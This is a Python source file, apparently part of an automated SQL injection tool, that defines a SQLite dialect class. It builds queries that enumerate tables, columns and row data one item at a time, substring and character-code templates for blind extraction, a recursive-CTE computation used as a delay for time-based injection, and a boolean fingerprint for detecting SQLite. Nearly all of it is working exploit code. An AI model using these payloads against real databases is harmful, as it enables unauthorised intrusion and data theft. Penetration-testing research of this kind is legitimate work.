"""SQLite dialect"""
from dbms.base import BaseDialect


class SQLiteDialect(BaseDialect):
    name = "sqlite"

    def version_expr(self): return "SQLITE_VERSION()"
    def database_expr(self): return "'main'"
    def current_user_expr(self): return "'n/a'"
    def is_dba_expr(self): return "1"

    def tables_query(self, db_name, idx):
        return (f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {idx}")

    def columns_query(self, table_name, db_name, idx):
        return (f"SELECT name FROM pragma_table_info('{table_name}') LIMIT 1 OFFSET {idx}")

    def column_types_query(self, table_name, db_name, idx):
        return (f"SELECT type FROM pragma_table_info('{table_name}') LIMIT 1 OFFSET {idx}")

    def data_query(self, table_name, column, idx):
        return f"SELECT {column} FROM {table_name} LIMIT 1 OFFSET {idx}"

    def substr_expr(self, sql, pos, length):
        return f"SUBSTR(({sql}),{pos},{length})"

    def ascii_expr(self, sql):
        return f"UNICODE(({sql}))"

    def substr_templates(self):
        return ["SUBSTR(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["UNICODE(({sql}))"]

    def concat_templates(self):
        return ["(({a})||({b})||({c}))"]

    def hex_to_str(self, hexstr):
        # SQLite's 0x.. is an integer and x'..' is a blob -- must CAST to text to compare against a string
        return f"CAST(x'{hexstr}' AS TEXT)"

    def sleep_expr(self, seconds):
        # SQLite has no SLEEP(), use a recursive CTE to produce computation volume
        return (f"(SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS "
                f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{max(1, seconds) * 200000}) "
                f"SELECT x FROM c))")

    def sleep_expr_variants(self, seconds):
        return [
            (f"(SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS "
             f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{max(1, seconds) * 200000}) "
             f"SELECT x FROM c))"),
            (f"(SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS "
             f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{max(1, seconds) * 600000}) "
             f"SELECT x FROM c))"),
        ]

    def error_payloads(self, inner):
        return [f"({inner})"]

    def error_fingerprints(self):
        return []

    def error_keywords(self):
        return ["SQLite"]

    def boolean_fingerprints(self):
        # Only put the criterion unique to this DBMS: sqlite_master errors out directly on other databases.
        # Don't attach spellings like `1=1` that hold on any database -- it makes the first dialect checked in the dictionary always hit.
        return ["(SELECT COUNT(*) FROM sqlite_master)>0"]